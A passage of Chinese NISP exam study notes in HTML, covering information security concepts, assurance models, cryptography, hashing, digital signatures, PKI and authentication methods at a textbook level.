</p><p>信息技术包括生产和应用两个方面</p><h5 id="信息技术发展阶段"><a href="#信息技术发展阶段" class="headerlink" title="信息技术发展阶段"></a>信息技术发展阶段</h5><p>微电子、通信、计算机和网络是信息系统的核心技术，其发展进程大致可分为以下四个阶段:<br>第一阶段:电讯技术的发明<br>第二阶段:计算机技术的发展<br>第三阶段:互联网的使用<br>第四阶段:网络社会</p><h5 id="信息安全"><a href="#信息安全" class="headerlink" title="信息安全"></a>信息安全</h5><p>在我国信息安全标准化委员会发布的GB/T 25069-2010信息安全技术术语》中<br>信息安全是指保持、维持信息的保密性、完整性和可用性，也可包括真实性、可核查性、抗抵赖性和可靠性等性质。</p><h5 id="信息安全的目标和任务"><a href="#信息安全的目标和任务" class="headerlink" title="信息安全的目标和任务"></a>信息安全的目标和任务</h5><p>保证信息上述安全属性得到保持，不被破坏，从而对组织业务运行能力提供支撑</p><p>保护信息资产（信息及信息系统）免受未经授权的访问使用、披露、破坏、修改、查看、记录及销毁</p><h5 id="信息安全的属性"><a href="#信息安全的属性" class="headerlink" title="信息安全的属性"></a>信息安全的属性</h5><p>基本属性：完整性、机密性、可用性<br>其他属性：真实性、可控性、不可否认性</p><p>消息层次：</p><p>机密性：机密性也称保密性，控制信息资源的开放范围，确保信息在存储、使用、传输过程中不会泄漏给非授权用户、实体和进程，或被其利用;</p><p>完整性:确保信息在存储、使用、传输过程中保持未经授权不能改变的特性，即对抗主动攻击，保持数据一致，防止数据被非法用户修改和破坏;</p><p>不可否认性:又称抗抵赖性，即建立有效的责任机制，防止用户否认其发送信息的行为和信息的内容;</p><p>网路层次：  </p><p>可用性:确保授权用户、实体和进程对信息及资源的正常使用不会被不合理拒绝，允许其可靠而及时地访问信息及资源</p><p>可控性:对信息的传播范围及内容具有控制能力,防止非法利用信息和信息系统</p><h5 id="信息安全的特征"><a href="#信息安全的特征" class="headerlink" title="信息安全的特征"></a>信息安全的特征</h5><p>相对性<br>安全是相对的、动态的，没有绝对安全的系统。所以需要及时对系统安全问题进行跟踪处理，定期进行整体安全评估，及时发现问题并加以解决</p><p>时效性<br>安全不能一劳永逸，需要根据安全风险，及时制定应对策略</p><p>相对性<br>在更改配置等操作时，需对系统重新进行评估和同步更新安全措施</p><p>不确定性<br>攻击发起的时间、地点、攻击者和攻击目标都具有不确定性，在制定安全应对措施时，要尽可能考量所有潜在的安全威胁</p><p>复杂性<br>信息安全是一项系统工程，涉及到安全管理、教育、培训、立法、国际合作等领域</p><p>与传统安全相比，信息安全的鲜明特征  </p><p>系统性<br>系统地从技术、管理、工程和标准法规等各层面综合保障的信息安全  </p><p>动态性<br>对信息安全不能抱有一劳永逸的思想，应该根据风险的变化，在信息系统的整个生命周期中采取相应的安全措施来控制风险    </p><p>无边界性<br>信息系统安全威胁超越了现实地域和现实行业的限制  </p><p>非传统性<br>与军事安全、政治安全等传统安全相比，信息安全涉及的领域和影响范围十分广泛</p><h5 id="信息系统安全"><a href="#信息系统安全" class="headerlink" title="信息系统安全"></a>信息系统安全</h5><p>设备安全、数据安全、内容安全、行为安全</p><h5 id="信息设备安全"><a href="#信息设备安全" class="headerlink" title="信息设备安全"></a>信息设备安全</h5><p>设备的稳定性、可靠性、可用性</p><h5 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全</h5><p>数据的秘密性、真实性、完整性</p><h5 id="内容安全"><a href="#内容安全" class="headerlink" title="内容安全"></a>内容安全</h5><p>内容安全是信息安全在法律、政治、道德层次的要求</p><p>政治上健康<br>符合国家法律法规<br>符合中华民族道德规范</p><h5 id="行为安全"><a href="#行为安全" class="headerlink" title="行为安全"></a>行为安全</h5><p>行为安全是信息安全的终极目的</p><p>行为的秘密性、完整性、可控性</p><h3 id="1-2-信息安全威胁"><a href="#1-2-信息安全威胁" class="headerlink" title="1.2 信息安全威胁"></a>1.2 信息安全威胁</h3><h5 id="我国面临的信息安全威胁"><a href="#我国面临的信息安全威胁" class="headerlink" title="我国面临的信息安全威胁"></a>我国面临的信息安全威胁</h5><p>国家威胁、组织威胁、个人威胁</p><h5 id="信息安全问题产生的根源"><a href="#信息安全问题产生的根源" class="headerlink" title="信息安全问题产生的根源"></a>信息安全问题产生的根源</h5><p>内因：<br>系统自身的脆弱性</p><p>系统的复杂性导致其脆弱性  </p><p>外因：<br>人为威胁、环境威胁</p><h3 id="1-3-信息安全发展阶段与形式"><a href="#1-3-信息安全发展阶段与形式" class="headerlink" title="1.3 信息安全发展阶段与形式"></a>1.3 信息安全发展阶段与形式</h3><h5 id="信息安全的发展阶段"><a href="#信息安全的发展阶段" class="headerlink" title="信息安全的发展阶段"></a>信息安全的发展阶段</h5><p>通信安全(COMSEC)<br>通过密码技术解决通信保密，保证数据的保密性和完整性<br>安全威胁：搭线窃听、密码学分析<br>安全措施：加密  </p><p>计算机安全(COMPUSEC)<br>确保信息系统的保密性、完整性和可用性<br>安全威胁：非法访问、恶意代码、脆弱口令…<br>安全措施：安全操作系统设计技术（TCB）</p><p>信息系统安全(INFOSEC)<br>确保信息在存储、处理和传输过程中免受偶然或恶意的泄密、非法访问或破坏<br>安全威胁：网络入侵、病毒破坏、信息对抗…<br>安全措施：防火墙、漏洞扫描、入侵检测、PKI、VPN…  </p><p>信息安全保障(IA)<br>动态安全,保障信息系统的业务正常、稳定的运行<br>综合技术、管理、过程、人员<br>安全威胁：黑客、恐怖分子、信息战、自然灾害、电力中断…<br>安全措施：技术安全保障体系、安全管理体系、人员意识/培训/教育…</p><h5 id="我国信息安全形势"><a href="#我国信息安全形势" class="headerlink" title="我国信息安全形势"></a>我国信息安全形势</h5><div class="hljs code-wrapper"><pre><code>2013年，“棱镜门”事件在全球持续发酵，隐藏在互联网背后的国家力量和无所不在的“监控”之手，引起舆论哗然和网络空间的连锁反应。全球范围内陡然上升的网络攻击威胁，导致各国对信息安全的重视程度急剧提高，越来越多的国家将信息安全列为国家核心安全利益。网络安全进一步成为大国竞争的战略基点，较量和博弈逐步深化升级。我国信息安全环境日趋复杂，网络安全问题对互联网的健康发展带来日益严峻的挑战，网络安全事件的影响力和破坏程度不断扩大。  针对网络信息的破坏活动日益严重，利用网络进行违法犯罪案件逐年上升。  安全漏洞和安全隐患增多，对信息安全构成严重威胁。黑客攻击、恶意代码对重要信息系统安全造成严重影响。  </code></pre></div><h3 id="1-4-信息安全保障"><a href="#1-4-信息安全保障" class="headerlink" title="1.4 信息安全保障"></a>1.4 信息安全保障</h3><h5 id="信息安全保障含义"><a href="#信息安全保障含义" class="headerlink" title="信息安全保障含义"></a>信息安全保障含义</h5><p>信息安全保障是指采用技术、管理等综合手段保护信息和信息系统能够安全运行的防护性行为。<br>它通过保证信息和信息系统的可用性、完整性、机密性和不可否认性来保护并防御信息和信息系统的操作，包括通过综合保护、检测和响应等能力为信息系统提供修复。</p><p><img src="/2022/02/10/NISP/1.4-1.png"></p><p>具体应用  </p><p>防止信息泄露、修改和破坏<br>检测入侵行为，计划和部署针对入侵行为的防御措施<br>采用安全措施和容错机制在遭受攻击的情况下保证机密性、私密性、完整性、抗抵赖性、真实性、可用性和可靠性<br>修复信息和信息系统所遭受的破坏  </p><h6 id="信息安全保障与信息安全、信息系统安全的区别"><a href="#信息安全保障与信息安全、信息系统安全的区别" class="headerlink" title="信息安全保障与信息安全、信息系统安全的区别"></a>信息安全保障与信息安全、信息系统安全的区别</h6><p>信息安全的重点是保护和防御，而安全保障的重点是保护、检测和响应综合</p><p>信息安全不太关注检测和响应，但是信息安全保障非常关注这两点  </p><p>攻击后的修复不在传统信息安全概念的范围之内，但是它是信息安全保障的重要组成部分。  </p><p>信息安全的目的是为了防止攻击的发生，而信息安全保障的目的是为了保证信息系统始终能保证维持特定水平的可用性、完整性、真实性、机密性和抗抵赖性。  </p><h5 id="信息安全保障模型"><a href="#信息安全保障模型" class="headerlink" title="信息安全保障模型"></a>信息安全保障模型</h5><p>信息安全保障模型能准确描述安全的重要方面与系统行为的关系，提高对成功实现关键安全需求的理解层次，</p><p>计划——执行——检测——改进（PDCA）模型</p><p>和信息保障技术框架是信息安全管理和信息安全保障技术实施过程遵循的方法和思想。</p><p>经典模型</p><h6 id="防护——检测——响应模型（PDR）"><a href="#防护——检测——响应模型（PDR）" class="headerlink" title="防护——检测——响应模型（PDR）"></a>防护——检测——响应模型（PDR）</h6><p>基于对攻击技术的假设，所设计的静态防御模型，难以适应网络安全环境的快速变化</p><h6 id="策略——防护——检测——响应模型（P2DR-PPDR）"><a href="#策略——防护——检测——响应模型（P2DR-PPDR）" class="headerlink" title="策略——防护——检测——响应模型（P2DR/PPDR）"></a>策略——防护——检测——响应模型（P2DR/PPDR）</h6><p>动态防御</p><h6 id="防护——检测——响应模型（PDR）-1"><a href="#防护——检测——响应模型（PDR）-1" class="headerlink" title="防护——检测——响应模型（PDR）"></a>防护——检测——响应模型（PDR）</h6><p>基本思想是承认信息系统中存在漏洞，正视系统面临的威胁，通过适度防护并加强检测，落实安全事件响应，建立威胁源威慑，保障系统安全。该模型认为，任何安全防护措施都是基于时间的，超过该时间段，这种防护措施就可能被攻破。PDR模型直观、实用，但对系统的安全隐患和安全措施采取相对固定的假设前提，难以适应网络安全环境的快速变化。</p><h6 id="策略——防护——检测——响应模型（P2DR-PPDR）-1"><a href="#策略——防护——检测——响应模型（P2DR-PPDR）-1" class="headerlink" title="策略——防护——检测——响应模型（P2DR/PPDR）"></a>策略——防护——检测——响应模型（P2DR/PPDR）</h6><p>即策略一防护―检测一响应。该模型的核心是信息系统所有防护、检测和响应都是依据安全策略实施的。</p><h5 id="信息安全保障的作用"><a href="#信息安全保障的作用" class="headerlink" title="信息安全保障的作用"></a>信息安全保障的作用</h5><p>由于网络信息传播的开放性、跨界性、即时性、交互性等特点，互联网在为广大民众提供越来越多有益信息及其他信息服务的同时，也存在着一些虚假和错误导向的信息，以及直接危害公众利益、民族团结、国家统一、社会稳定和国家安全的违法与有害信息及活动。构建更加安全可靠、更加有用、更加可信的互联网，服务于建设小康社会和构建和谐社会，是我国加强信息安全保障的一个重要任务。</p><p>在实施国家信息化发展战略中，要高度重视信息安全保障体系建设，实现信息化与信息安全协调发展<br>国家基础信息网络、重要信  息系统以及政府、企业和公民的信息活动的安全若不能得到切实保障，信息化带来的巨大经济与社会效益就难以有效发挥，信息化发展也会受到严重制约<br>加强信息安全保障的目的，就是要保障和促进信息化发展，而不是以牺牲信息化发展来换取信息安全  </p><p>采取不上网、不共享、不互联互通等传统封闭的方式保安全，会严重影响甚至阻碍信息化发展，也不可能从粮本上解决信息安全保障问题。<br>只有继续大力推动信息化建设，全面提高信息化发展水平，才能为应对客种信息安全问题提供强有力的物质和技术保障。<br>全面推进信息化，只有高度重视信息安全保障建设，才能形成健康有序、安全稳定的信意网络秩序，穿能确保信息化进程稳步、快速地发展。</p><p>为有效开展互联网治理工作，我国政府提出了互联网管理的基本原则，即积极促进互联网发展,并依法进行管理，鼓励行业自律和公众监督，旨在形成一个可信和安全的互联网信息空间。</p><h3 id="1-5-信息系统安全保障"><a href="#1-5-信息系统安全保障" class="headerlink" title="1.5 信息系统安全保障"></a>1.5 信息系统安全保障</h3><h5 id="信息系统"><a href="#信息系统" class="headerlink" title="信息系统"></a>信息系统</h5><p>信息系统是具有集成性的系统，每一个组织中信息流动的总和构成一个信息系统。信息系统是根据一定的需要进行输入、系统控制、数据处理、数据存储与输出等活动而涉及到的所有因素的综合体。</p><p><img src="/2022/02/10/NISP/1.5-1.png"></p><h5 id="信息系统安全保障的含义"><a href="#信息系统安全保障的含义" class="headerlink" title="信息系统安全保障的含义"></a>信息系统安全保障的含义</h5><p>信息系统安全保障是在信息系统的整个生命周期中，从技术、管理、工程和人员等方面提出安全保障要求，确保信息系统的保密性、完整性和可用性，降低安全风险到可接受的程度，从而保障系统实现组织机构的使命。</p><p><img src="/2022/02/10/NISP/1.5-2.png"></p><p>风险  </p><p>信息安全风险产生的因素主要有信息系统自身存在的漏洞和来自系统外部的威胁。信息系统运行环境中存在具有特定威胁动机的威胁源，通过使用各种攻击方法，利用信息系统的各种脆弱性，对信息系统造成一定的不良影响，由此引发信息安全事件和问题。</p><p>保障  </p><p>为了降低信息安全风险，信息安全保障就是针对信息系统在运行环境中所面临的各种风险，制定信息安全保障策略，在策略指导下，设计并实现信息安全保障架构或模型，采取技术、管理等安全保障措施，将风险控制到可接受的范围和程度，从而实现其业务使命。</p><p>使命  </p><p>描述了信息系统从设计、开发、测试、部署、维护、废弃整个生命周期中运行的需求和目标。信息系统的使命与其安全保障密不可分，需要通过信息系统安全措施来保障目标正确执行。随着信息系统面临的威胁及运行环境的变化，安全保障也需要提供相应的保障措施，从而保障信息系统的正确运行。</p><h5 id="信息系统安全保障模型"><a href="#信息系统安全保障模型" class="headerlink" title="信息系统安全保障模型"></a>信息系统安全保障模型</h5><p><img src="/2022/02/10/NISP/1.5-3.png"></p><hr><hr><hr><h2 id="第二章-信息安全基础技术"><a href="#第二章-信息安全基础技术" class="headerlink" title="第二章 信息安全基础技术"></a>第二章 信息安全基础技术</h2><h3 id="2-1-密码学"><a href="#2-1-密码学" class="headerlink" title="2.1 密码学"></a>2.1 密码学</h3><p><img src="/2022/02/10/NISP/2.1-1.png"></p><h5 id="密码学发展"><a href="#密码学发展" class="headerlink" title="密码学发展"></a>密码学发展</h5><p>古典密码——近代密码——现代密码——公钥密码</p><p><img src="/2022/02/10/NISP/2.1-2.png"></p><h5 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h5><p>古典密码体制的安全性在于保持算法本身的保密性，受到算法限制。</p><p>——不适合大规模生产<br>——不适合较大的或者人员变动较大的组织（间谍）<br>——用户无法了解算法的安全性  </p><h5 id="近代密码"><a href="#近代密码" class="headerlink" title="近代密码"></a>近代密码</h5><p>主要标志是机械密码/机电密码，用机电代替手工  </p><p>——近代密码体制是用机械或电动机械实现的，最著名的就是转轮机</p><p><img src="/2022/02/10/NISP/2.1-3.png"></p><h5 id="现代密码"><a href="#现代密码" class="headerlink" title="现代密码"></a>现代密码</h5><p>数据的安全基于密钥而不是算法的保密。</p><h5 id="公钥密码"><a href="#公钥密码" class="headerlink" title="公钥密码"></a>公钥密码</h5><p>公钥密码使得发送端和接收端无密钥传输的保密通信成为可能</p><h5 id="加密与解密"><a href="#加密与解密" class="headerlink" title="加密与解密"></a>加密与解密</h5><p>明文(Plaintext)：原始消息、被隐蔽消息、未经加密的消息<br>密文(Ciphertext)或密报(Cryptogram)：明文经密码变换而成的一种隐蔽形式<br>加密员或密码员(Cryptographer)：对明文进行加密操作的人员  </p><p><img src="/2022/02/10/NISP/2.1-4.png"></p><p>加密( Encryption )：将明文变换为密文的过程<br>解密(Decryption )：由密文恢复出原明文的过程  </p><p><img src="/2022/02/10/NISP/2.1-5.png"></p><p>加密可以采用密码算法来实现，密码算法从密钥使用角度，可分为对称密码算法和非对称密码算法。</p><h5 id="对称密码"><a href="#对称密码" class="headerlink" title="对称密码"></a>对称密码</h5><p>对称密码算法（也称单钥或私钥密码算法）∶加密密钥和解密密钥相同，或实质上等同，即从一个易于推出另一个。</p><p>——DES、3DES、IDEA、AES<br>——密钥相对较短，一般采用128，192或者256比特</p><p><img src="/2022/02/10/NISP/2.1-6.png"></p><p>优点∶<br>效率高，算法简单，系统开销小-适合加密大量数据<br>明文长度与密文长度相等</p><p>缺点∶<br>需要以安全方式进行密钥交换-密钥管理复杂<br>无法解决消息的篡改、否认等问题  </p><h5 id="非对称密码"><a href="#非对称密码" class="headerlink" title="非对称密码"></a>非对称密码</h5><p>非对称密码算法︰加密密钥和解密密钥不同，从一个很难推出另一个。其中对外公开的密钥，称为公开密钥(public key)，简称公钥;必须保密的密钥称为私有密钥(private key)，简称私钥。又叫公钥密码算法 (Public-keycipher)。</p><p>——RSA、ECC、EIGamal</p><p>——公钥加密 私钥解密<br>——私钥加密 公钥解密<br>——密钥长度512-2048位</p><p><img src="/2022/02/10/NISP/2.1-7.png"></p><p>优点：<br>密钥分发数目与参与者数目相同<br>在有大量参与者的情况下易于密钥管理<br>安全<br>支持数字签名和不可否认性<br>无需事先与对方建立关系，交换密钥  </p><p>缺点：<br>速度相对较慢<br>可能比同等强度的对称密码算法慢10倍到100倍<br>加密后，密文变长  </p><h5 id="混合加密"><a href="#混合加密" class="headerlink" title="混合加密"></a>混合加密</h5><p>加密过程：  </p><p>用对称加密密文，用非对称加密对称密钥，同时传输两个密文</p><p>用对称加密密文</p><p><img src="/2022/02/10/NISP/2.1-8.png"></p><p>用非对称加密对称密钥</p><p><img src="/2022/02/10/NISP/2.1-9.png"></p><p>解密过程：</p><p>用非对称私钥解密对称密钥，再用对称密钥解密文</p><p>用非对称私钥解密对称密钥</p><p><img src="/2022/02/10/NISP/2.1-10.png"></p><p>用对称密钥解密文</p><p><img src="/2022/02/10/NISP/2.1-11.png"></p><p>——保证安全性的同时，提高了效率</p><h5 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h5><p>对称密码和非对称密码算法主要解决信息的机密性问题，而实际系统和网络还可能受到消息篡改等攻击。  </p><p>篡改攻击主要包括:修改信息内容，改变程序使其不能正确运行等。哈希函数可以用来保证信息的完整性。  </p><p>哈希(Hash)函数(也称为杂凑函数或单向散列函数)接受一个消息作为输入，产生一个称为哈希值的输出。输出的哈希值也可称为散列值、消息摘要(Message Digest,MD)</p><p>————完整性</p><p><img src="/2022/02/10/NISP/2.1-12.png"></p><h5 id="MD5算法"><a href="#MD5算法" class="headerlink" title="MD5算法"></a>MD5算法</h5><p>MD：Message Digest，消息摘要</p><p>——输入：任意长度的消息<br>——输出：128位消息摘要<br>——处理：以512位输入数据块为单位</p><h5 id="SHA-1算法"><a href="#SHA-1算法" class="headerlink" title="SHA-1算法"></a>SHA-1算法</h5><p>SHA (Secure Hash Algorithm，安全哈希算法)由美国国家标准技术研究所开发，1993年作为联邦信息处理标准发布，2008年又有更新。</p><p>——输入：最大长度为264位的消息<br>——输出：160位消息摘要<br>——处理：输入以512位输入数据块为单位处理</p><h5 id="比较SHA1-MD5"><a href="#比较SHA1-MD5" class="headerlink" title="比较SHA1/MD5"></a>比较SHA1/MD5</h5><p><img src="/2022/02/10/NISP/2.1-13.png"></p><h5 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h5><p><img src="/2022/02/10/NISP/2.1-14.png"></p><p>除了保护信息的机密性和完整性，密码学技术也可以解决信息的可鉴别性(真实性或认证性)和不可否认性。</p><p><img src="/2022/02/10/NISP/2.1-15.png"></p><p>传统签名的基本特点：<br>一能与被签的文件在物理上不可分割<br>——签名者不能否认自己的签名<br>——签名不能被伪造<br>——容易被验证  </p><p>数字签名是传统签名的数字化，基本要求：<br>一能与所签文件“绑定”<br>——签名者不能否认自己的签名<br>——签名不能被伪造<br>——容易被验证  </p><p>数字签名的应用  </p><p>(1)可信性:签名让文件的接收者相信签名者是慎重地在文件上签名的<br>(2)不可重用性:签名不可重用，即使同一消息在不同时刻的签名也是有区别的。如果将签名部分提取出来，附加在别的消息后面，验证签名会失败。这是因为签名和所签名消息之间是一一对应的，消息不同签名内容也不同，因此签名无法重复使用。<br>(3)数据完整性:在文件签名后，文件不能改变。<br>(4)不可伪造性:签名能够证明是签名者而不是其他人在文件上签名，任何人都不能伪造签名。<br>(5)不可否认性:在签名者否认自己的签名时，签名接收者可以请求可信第二方进行仲裁。  </p><h5 id="对称密码体制和非对称密码体制的优缺点是什么"><a href="#对称密码体制和非对称密码体制的优缺点是什么" class="headerlink" title="对称密码体制和非对称密码体制的优缺点是什么?"></a>对称密码体制和非对称密码体制的优缺点是什么?</h5><p>对称<br>效率高、算法简单、系统开销小、适合对大量数据进行加密、明文长度和密文长度相等<br>需要以安全的方式进行密钥的交换、无法解决消息的篡改和否认</p><p>非对称<br>密钥分发数目和参与者数目相同、安全性高、支持数字签名、有不可否认性、事先不需要建立连接来进行密钥交换<br>速度慢、效率低、相对于对称慢10-100倍、加密后密文变长</p><h3 id="2-2-数字证书与公钥基础设施"><a href="#2-2-数字证书与公钥基础设施" class="headerlink" title="2.2 数字证书与公钥基础设施"></a>2.2 数字证书与公钥基础设施</h3><h5 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h5><p><img src="/2022/02/10/NISP/2.2-1.png"></p><h5 id="公钥基础设施"><a href="#公钥基础设施" class="headerlink" title="公钥基础设施"></a>公钥基础设施</h5><p>PKI : Public Key Infrastructure公钥基础设施</p><p>——CA、RA、</p><p>——利用公开密钥技术建立的提供信息安全服务的在线基础设施。它利用加密、数字签名、数字证书来保护应用、通信或事务处理的安全。<br>——是一个包括硬件、软件、人员、策略和规程的集合，用来实现基于公钥密码体制的密钥和数字证书的产生、管理、存储、分发和撤销等功能。<br>——如同电力基础设施为家用电器提供电力一样，PKI为各种应用提供安全保障，提供网络信任基础。</p><h5 id="CA：认证权威机构"><a href="#CA：认证权威机构" class="headerlink" title="CA：认证权威机构"></a>CA：认证权威机构</h5><p>CA专门负责数字证书的产生、发放和管理，以保证数字证书真实可靠。它是公钥基础设施PKI的核心，CA负责管理P阳结构下的所有用户(包括各种应用程序)证书，把用户的公钥和用户的其他信息捆绑在一起，在网上验证用户的身份。</p><p>CA的主要功能</p><p><img src="/2022/02/10/NISP/2.2-2.png"></p><h5 id="RA：证书注册机构"><a href="#RA：证书注册机构" class="headerlink" title="RA：证书注册机构"></a>RA：证书注册机构</h5><p><img src="/2022/02/10/NISP/2.2-3.png"></p><h5 id="LDAP：目录服务"><a href="#LDAP：目录服务" class="headerlink" title="LDAP：目录服务"></a>LDAP：目录服务</h5><p>——证书的存储库，提供了证书的保存、修改、删除和获取的能力<br>——CA采用LDAP标准的目录服务存放证书，其作用与数据库相同，优点是在修改操作少的情况下，对于访问的效率比传统数据库要高</p><h5 id="CRL：证书撤销列表"><a href="#CRL：证书撤销列表" class="headerlink" title="CRL：证书撤销列表"></a>CRL：证书撤销列表</h5><p>也称“证书黑名单”<br>——在证书的有效期期间，因为某种原因（如人员调动、私钥泄漏等等），导致相应的数字证书内容不再是真实可信，此时，进行证书撤销，说明该证书已是无效<br>——CRL中列出了被撤销的证书序列号</p><h5 id="证书载体"><a href="#证书载体" class="headerlink" title="证书载体"></a>证书载体</h5><p>内存、IC卡、软盘、USB-KEY、U盘</p><h5 id="PKL-CA技术的典型应用"><a href="#PKL-CA技术的典型应用" class="headerlink" title="PKL/CA技术的典型应用"></a>PKL/CA技术的典型应用</h5><p><img src="/2022/02/10/NISP/2.2-4.png"></p><h5 id="什么是数字证书？其作用是什么？"><a href="#什么是数字证书？其作用是什么？" class="headerlink" title="什么是数字证书？其作用是什么？"></a>什么是数字证书？其作用是什么？</h5><p>数字证书是一段经认证权威机构签名，包含拥有者身份信息和公开密钥的数据体。<br>数字证书和一对公私钥相对应，在电子商务和网络信息的交流中，解决互相信任的问题。</p><h3 id="2-3-身份认证"><a href="#2-3-身份认证" class="headerlink" title="2.3 身份认证"></a>2.3 身份认证</h3><h5 id="身份认证的基本方法"><a href="#身份认证的基本方法" class="headerlink" title="身份认证的基本方法"></a>身份认证的基本方法</h5><p>身份认证是用户登录系统或网站面对的第一道安全防线，如输入账号口令来登录。  身份认证是在网络中确认操作者身份的过程。  </p><p>身份认证一般依据以下三种基本情况或这三种情况的组合来鉴别用户身份。</p><p>(1)用户所知道的东西，例如口令、密钥等;<br>(2)用户拥有的东西，例如印章、U盾(USB Key)等;<br>(3)用户所具有的生物特征:例如指纹、声音、虹膜、人脸等。</p><h4 id="1-根据”用户所知”进行认证的方法有-静态口令认证、短信口令认证和动态口令认证等。"><a href="#1-根据”用户所知”进行认证的方法有-静态口令认证、短信口令认证和动态口令认证等。" class="headerlink" title="(1)根据”用户所知”进行认证的方法有:静态口令认证、短信口令认证和动态口令认证等。"></a>(1)根据”用户所知”进行认证的方法有:静态口令认证、短信口令认证和动态口令认证等。</h4><h5 id="静态口令认证"><a href="#静态口令认证" class="headerlink" title="静态口令认证"></a>静态口令认证</h5><p>静态口令<br>——口令固定不变，并且长期有效<br>——弱鉴别(weak authentication)</p><p><img src="/2022/02/10/NISP/2.3-1.png"></p><h5 id="静态口令认证缺点"><a href="#静态口令认证缺点" class="headerlink" title="静态口令认证缺点"></a>静态口令认证缺点</h5><p>通信窃取——窃听获得明文的用户名和口令</p><p>重放攻击——截获登录数据（明/密），重放攻击</p><p>字典攻击——选择有意义的单词或数字作字典</p><p>暴力攻击一穷举全部可能组合猜测口令</p><p>外部泄漏——搜索存有口令的纸片或文件</p><p>窥探——安装监视器或从背后窥探</p><p>社交工程——冒充合法用户、假冒管理员，骗取口令</p><h5 id="短信口令认证"><a href="#短信口令认证" class="headerlink" title="短信口令认证"></a>短信口令认证</h5><p>是利用移动网络动态口令的认证方式。短信口令验证以手机短信形式请求包含6位随机数的动态口令，身份认证系统以短信形式发送随机的6位动态口令到用户的手机上，用户在认证时输入此动态口令即可</p><p>由于手机与用户绑定比较紧密，短信口令生成与使用场景是物理隔绝的，因此口令在通路上被截取几率较低。</p><h5 id="动态口令认证"><a href="#动态口令认证" class="headerlink" title="动态口令认证"></a>动态口令认证</h5><p>一次性口令( One Time Password ,OTP )</p><p>口令动态性–每次变化，无须人工干预<br>口令随机性–随机性强，难以猜测</p><h4 id="2-根据”用户所有”进行认证的方法有-U盾-USB-Key-、电子印章等。"><a href="#2-根据”用户所有”进行认证的方法有-U盾-USB-Key-、电子印章等。" class="headerlink" title="(2)根据”用户所有”进行认证的方法有:U盾(USB Key)、电子印章等。"></a>(2)根据”用户所有”进行认证的方法有:U盾(USB Key)、电子印章等。</h4><p>USB Key认证:基于USB Key的认证方法是近几年发展起来的一种方便、安全的身份认证技术。它采用软硬件相结合的挑战/应答认证模式。USB Key是一种USB接口的硬件设备，它内置单片机或智能卡芯片，可以存储用户的密钥或数字证书，利用USB Key内置的密码算法实现对用户身份的认证。挑战/应答认证模式，即认证系统发送一个随机数(挑战)，用户使用USB Key 中的密钥和算法计算出一个数值(应答)，认证系统对该数值进行检验，若正确则认为是合法用户。</p><h4 id="（3）基于生物特征的身份认证"><a href="#（3）基于生物特征的身份认证" class="headerlink" title="（3）基于生物特征的身份认证"></a>（3）基于生物特征的身份认证</h4><p>指纹，视网膜，声音，虹膜、语音、面部、签名等</p><p>查询特征、存储特征——节省资源、快速查询</p><p><img src="/2022/02/10/NISP/2.3-2.png"></p><p><img src="/2022/02/10/NISP/2.3-3.png"></p><h5 id="指纹识别的实现原理"><a href="#指纹识别的实现原理" class="headerlink" title="指纹识别的实现原理"></a>指纹识别的实现原理</h5><p>通过特殊的光电扫描和计算机图像处理技术，对指纹进行采集、分析和比对，自动、迅速、准确地认证出个人身份</p><p>指纹识别的过程</p><p>按照用户和姓名等信息将其存在指纹数据库中的模板指纹调出来，然后再用用户输入的指纹与该模板的指纹相匹配，以确定这两幅指纹是否出于同一幅指纹</p><p><img src="/2022/02/10/NISP/2.3-4.png"></p><h5 id="虹膜识别的实现原理"><a href="#虹膜识别的实现原理" class="headerlink" title="虹膜识别的实现原理"></a>虹膜识别的实现原理</h5><p>虹膜是环绕在瞳孔四周有色彩的部分</p><p>每一个虹膜都包含一个独一无二的基于像冠、水晶体、细丝、斑点、结构、凹点、射线、皱纹和条纹等特征的结构</p><p>每一个人的虹膜各不相同，一个人的左眼和右眼就可能不一样，即使是双胞胎的虹膜也可能不一样</p><p>人的虹膜在出生后6-18个月成型后终生不再发生变化</p><h4 id="其他身份认证技术"><a href="#其他身份认证技术" class="headerlink" title="其他身份认证技术"></a>其他身份认证技术</h4><h5 id="单点登录-Sso-Single-Sign-on"><a href="#单点登录-Sso-Single-Sign-on" class="headerlink" title="单点登录(Sso ,Single Sign-on)"></a>单点登录(Sso ,Single Sign-on)</h5><p>用户只需在登录时进行一次注册，就可以访问多个系统，不必重复输入用户名和密码来确定身份</p><h5 id="Kerberos提供了一个网络环境下的身份认证框架结构"><a href="#Kerberos提供了一个网络环境下的身份认证框架结构" class="headerlink" title="Kerberos提供了一个网络环境下的身份认证框架结构"></a>Kerberos提供了一个网络环境下的身份认证框架结构</h5><p>实现采用对称密钥加密技术<br>公开发布的Kerberos版本包括版本4和版本5-安全性、可靠性、可伸缩性、透明性</p><h5 id="远程用户拨号认证系统-Remote-Authentication-Dial-In-UserService"><a href="#远程用户拨号认证系统-Remote-Authentication-Dial-In-UserService" class="headerlink" title="远程用户拨号认证系统( Remote Authentication Dial In UserService)"></a>远程用户拨号认证系统( Remote Authentication Dial In UserService)</h5><p>RADIUS是一种C/S结构的协议，它的客户端最初就是NAS (NetAccess Server)服务器，现在任何运行RADIUS客户端软件的计算机都可以成为RADIUS的客户端</p><p>基本设计组件有认证、授权和记账(AAA)</p><p>简单明确，可扩充</p><p>使用UDP端口1812，1813</p><h3 id="2-4-访问控制"><a href="#2-4-访问控制" class="headerlink" title="2.4 访问控制"></a>2.4 访问控制</h3><h5 id="访问控制︰针对越权使用资源的防御措施"><a href="#访问控制︰针对越权使用资源的防御措施" class="headerlink" title="访问控制︰针对越权使用资源的防御措施"></a>访问控制︰针对越权使用资源的防御措施</h5><p>目标︰<br>防止对任何资源（如计算资源、通信资源或信息资源）进行未授权的访问，从而使资源在授权范围内使用，决定用户能做什么，也决定代表一定用户利益的程序能做什么。</p><p>未授权访问∶包括未经授权的使用、泄露、修改.销毁信息以及颁发指令等<br>非法用户对系统资源的使用-合法用户对系统资源的非法使用</p><p>作用︰<br>机密性、完整性和可用性</p><h5 id="主体与客体"><a href="#主体与客体" class="headerlink" 